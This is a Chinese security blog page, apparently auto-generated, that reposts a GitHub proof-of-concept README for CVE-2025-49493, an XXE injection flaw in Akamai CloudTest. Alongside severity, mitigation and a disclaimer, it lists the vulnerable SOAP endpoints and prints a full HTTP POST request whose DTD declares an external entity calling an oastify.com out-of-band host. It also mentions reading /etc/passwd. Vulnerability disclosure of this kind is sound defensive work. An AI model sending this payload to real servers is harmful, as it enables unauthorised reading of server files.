@@ -1,0 +1,752 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lianccc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞信息漏洞名称： Akamai CloudTest XXE Injection Vulnerability 漏洞编号：  CVE： CVE-2025-49493  漏洞类型： XML实体注入 漏洞等级： 中危 漏洞描述： Akamai CloudTest是一款广泛使用的云测试平台，主要用于企业级服务的性能测试和安全评估。该平台通过模拟大量用户请求来测试Web应用和服务的稳定性和安全性，因此在企业">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Akamai CloudTest XXE Injection Vulnerability">
+<meta property="og:url" content="http://example.com/2025/07/05/github_1717591136/index.html">
+<meta property="og:site_name" content="liancc&#39; infos blog">
+<meta property="og:description" content="漏洞信息漏洞名称： Akamai CloudTest XXE Injection Vulnerability 漏洞编号：  CVE： CVE-2025-49493  漏洞类型： XML实体注入 漏洞等级： 中危 漏洞描述： Akamai CloudTest是一款广泛使用的云测试平台，主要用于企业级服务的性能测试和安全评估。该平台通过模拟大量用户请求来测试Web应用和服务的稳定性和安全性，因此在企业">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-07-05T14:00:26.000Z">
+<meta property="article:modified_time" content="2025-07-05T14:00:26.423Z">
+<meta property="article:author" content="lianccc">
+<meta property="article:tag" content="CVE-2025:github search">
+<meta property="article:tag" content="XML实体注入">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Akamai CloudTest XXE Injection Vulnerability - liancc&#39; infos blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="liancc' infos blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Craw Info</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Akamai CloudTest XXE Injection Vulnerability"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-05 14:00" pubdate>
+          2025年7月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          788 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Akamai CloudTest XXE Injection Vulnerability</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Akamai CloudTest XXE Injection Vulnerability</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2025-49493</li>
+</ul>
+<p><strong>漏洞类型：</strong> XML实体注入</p>
+<p><strong>漏洞等级：</strong> 中危</p>
+<p><strong>漏洞描述：</strong> Akamai CloudTest是一款广泛使用的云测试平台，主要用于企业级服务的性能测试和安全评估。该平台通过模拟大量用户请求来测试Web应用和服务的稳定性和安全性，因此在企业和服务提供商中非常受欢迎。此次发现的XXE注入漏洞影响了版本60（构建12988）之前的所有Akamai CloudTest实例。</p>
+<p>该漏洞属于XML外部实体注入（XXE）类型，其技术根源在于Akamai CloudTest在处理SOAP请求时，未能正确限制XML解析器对外部实体的处理。攻击者可以通过构造恶意的XML请求，利用SOAP端点（如&#x2F;concerto&#x2F;services&#x2F;RepositoryService等）注入外部DTD，进而读取服务器上的本地文件内容。这种攻击不需要任何形式的认证或用户交互，使得风险大大增加。</p>
+<p>从影响分析来看，此漏洞可能导致严重的安全风险，包括但不限于敏感信息泄露（如读取&#x2F;etc&#x2F;passwd文件）、服务器配置暴露等。由于攻击者可以远程利用此漏洞，且无需认证，因此该漏洞的潜在危害范围广泛，尤其是在未及时打补丁的环境中。此外，攻击者还可能利用此漏洞进行进一步的网络渗透，如利用泄露的信息进行更有针对性的攻击。因此，建议所有使用Akamai CloudTest的企业和服务提供商立即升级到版本60或更高版本，以防范潜在的安全威胁。</p>
+<p><strong>产品厂商：</strong> Akamai</p>
+<p><strong>产品名称：</strong> Akamai CloudTest</p>
+<p><strong>影响版本：</strong> version &lt; 60 (build 12988)</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/B1ack4sh/Blackash-CVE-2025-49493">https://github.com/B1ack4sh/Blackash-CVE-2025-49493</a></p>
+<p><strong>类型：</strong> CVE-2025:github search</p>
+<h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
+<li>README.md</li>
+</ul>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49493-Akamai-CloudTest-XXE-Injection"><a href="#CVE-2025-49493-Akamai-CloudTest-XXE-Injection" class="headerlink" title="CVE-2025-49493 Akamai CloudTest - XXE Injection"></a>CVE-2025-49493 Akamai CloudTest - XXE Injection</h2><h3 id="📄-Description"><a href="#📄-Description" class="headerlink" title="📄 Description:"></a>📄 Description:</h3><p>Akamai CloudTest before 60 2025.06.02 (12988) allows file inclusion via XML External Entity (XXE) injection.</p>
+<hr>
+<h3 id="🛠️-Basic-Information"><a href="#🛠️-Basic-Information" class="headerlink" title="🛠️ Basic Information:"></a>🛠️ Basic Information:</h3><ul>
+<li><strong>Affected Product</strong>: Akamai CloudTest (prior to version 60 — build 12988, released June 2025)</li>
+<li><strong>Vulnerability Type</strong>: XML External Entity Injection (XXE)</li>
+<li><strong>CWE</strong>: CWE‑611 – Improper Restriction of XML External Entity</li>
+<li><strong>Impact</strong>: Remote attackers can send crafted XML to read local files on the server without authentication or user interaction.</li>
+</ul>
+<hr>
+<h3 id="🔍-Technical-Details"><a href="#🔍-Technical-Details" class="headerlink" title="🔍 Technical Details:"></a>🔍 Technical Details:</h3><ul>
+<li>Vulnerable SOAP endpoints include:</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/concerto/</span>services/RepositoryService<br><span class="hljs-regexp">/concerto/</span>services/CollectorService<br><span class="hljs-regexp">/concerto/</span>services/Concerto<br><span class="hljs-regexp">/concerto/</span>services/SampleService<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">//concerto/services/RepositoryService</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>readacted.com<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Brave&quot;;v=&quot;138&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (******; **** *** ** X 10_15_7) **********/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 *****/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8<br><span class="hljs-attribute">Sec-Gpc</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>610<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">soapenv</span>:Envelope [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://b6it5hei11vmt9as2lbg98h4gvmrahy6.oastify.com&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">                  <span class="hljs-attr">xmlns:rep</span>=<span class="hljs-string">&quot;http://example.com/services/repository&quot;</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>/&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">rep:getUIBundleObjectXml</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">rep:uiBundleRequestXml</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">rep:uiBundleRequestXml</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">rep:getUIBundleObjectXml</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>The flaw allows attackers to inject external DTDs (Document Type Definitions) and exploit XML parsers to leak local file content.</li>
+<li>Techniques such as error-based parsing and out-of-band (OOB) data exfiltration can be used.</li>
+</ul>
+<hr>
+<h3 id="📊-Severity"><a href="#📊-Severity" class="headerlink" title="📊 Severity:"></a>📊 Severity:</h3><ul>
+<li><strong>CVSS v3.1 Score</strong>: 5.8 (Medium 🟠)</li>
+<li><strong>Attack Vector</strong>: Network</li>
+<li><strong>Privileges Required</strong>: None</li>
+<li><strong>User Interaction</strong>: None</li>
+<li><strong>Impact</strong>: Confidentiality breach (e.g., reading <code>/etc/passwd</code>)</li>
+</ul>
+<hr>
+<h3 id="✅-Mitigation-Steps"><a href="#✅-Mitigation-Steps" class="headerlink" title="✅ Mitigation Steps:"></a>✅ Mitigation Steps:</h3><ol>
+<li><strong>Update to CloudTest version 60 or later</strong>, where external entity parsing is disabled by default.</li>
+<li><strong>Disable DTD processing</strong> in XML parsers manually if an upgrade isn’t possible.</li>
+<li><strong>Restrict network access</strong> to CloudTest instances (e.g., via firewalls and IP allowlists).</li>
+<li><strong>Monitor XML traffic</strong> for anomalies or known exploit patterns.</li>
+<li><strong>Limit file access permissions</strong> for the CloudTest service to reduce impact.</li>
+<li><strong>Deploy a WAF (Web Application Firewall)</strong> with rules against XXE attacks.</li>
+</ol>
+<hr>
+<h3 id="📅-Timeline"><a href="#📅-Timeline" class="headerlink" title="📅 Timeline:"></a>📅 Timeline:</h3><ul>
+<li>Vulnerability discovered: June 2025</li>
+<li>Fix released: Early July 2025</li>
+<li>Proof of Concept (PoC) exists publicly.</li>
+<li>No confirmed mass exploitation as of now.</li>
+</ul>
+<hr>
+<h4 id="✅-Summary-Table"><a href="#✅-Summary-Table" class="headerlink" title="✅ Summary Table:"></a>✅ Summary Table:</h4><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Product</td>
+<td>Akamai CloudTest &lt; v60</td>
+</tr>
+<tr>
+<td>CVSS Score</td>
+<td>5.8 (Medium)</td>
+</tr>
+<tr>
+<td>Exploitable</td>
+<td>Remotely, no auth required</td>
+</tr>
+<tr>
+<td>Affected Feature</td>
+<td>XML SOAP services</td>
+</tr>
+<tr>
+<td>Attack Technique</td>
+<td>XXE via external DTDs</td>
+</tr>
+<tr>
+<td>Patch</td>
+<td>Available in version 60 (June 2025)</td>
+</tr>
+<tr>
+<td>Risk</td>
+<td>Disclosure of sensitive files</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="⚠️-Disclaimer"><a href="#⚠️-Disclaimer" class="headerlink" title="⚠️ Disclaimer:"></a>⚠️ Disclaimer:</h3><p>This PoC is provided for educational and research purposes only. Running this on any system without permission is illegal and unethical !!!</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Github-Poc/" class="category-chain-item">Github Poc</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
+      
+        <a href="/tags/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/" class="print-no-link">#XML实体注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Akamai CloudTest XXE Injection Vulnerability</div>
+      <div>http://example.com/2025/07/05/github_1717591136/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lianccc</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/05/twitter_2198364211/" title="HypnInfoSec Twitter Update !">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HypnInfoSec Twitter Update !</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/05/twitter_3394795140/" title="Bavenhack Twitter Update !">
+                        <span class="hidden-mobile">Bavenhack Twitter Update !</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
